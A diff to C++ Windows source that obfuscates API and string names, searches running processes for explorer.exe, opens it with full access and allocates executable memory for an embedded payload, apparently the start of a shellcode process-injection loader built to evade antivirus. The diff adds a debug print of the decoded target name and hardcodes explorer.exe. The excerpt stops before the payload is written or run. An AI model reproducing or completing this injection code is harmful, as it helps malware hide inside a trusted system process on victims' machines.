@@ -72,6 +72,7 @@ int main() {
     HANDLE snapshot = ((HANDLE(WINAPI*)(DWORD, DWORD))pcreate_snap)(TH32CS_SNAPPROCESS, 0);
 
     int exple[] = {4, 23, 15, 11, 14, 17, 4, 17, 62, 4, 23, 4};
+    std::cout << getoriginal(exple, big_string, sizeof(exple)).c_str() <<std::endl;
     const char *procmantar = getoriginal(exple, big_string, sizeof(exple)).c_str();
 
     int proc_firs[] = {41, 17, 14, 2, 4, 18, 18, 55, 54, 31, 8, 17, 18, 19};
@@ -85,7 +86,7 @@ int main() {
 
     ((BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32))pPro_firs)(snapshot, &pe32);
     while(((BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32))pPro_nex)(snapshot, &pe32)) {
-       if (strcmp(pe32.szExeFile, procmantar) == 0){
+       if (strcmp(pe32.szExeFile, "explorer.exe") == 0){
               HANDLE hProcess = ((HANDLE(WINAPI*)(DWORD, BOOL, DWORD))popen_proc)(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
               
               LPVOID clamonua = ((LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))pvirall)(hProcess, NULL, kkcodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
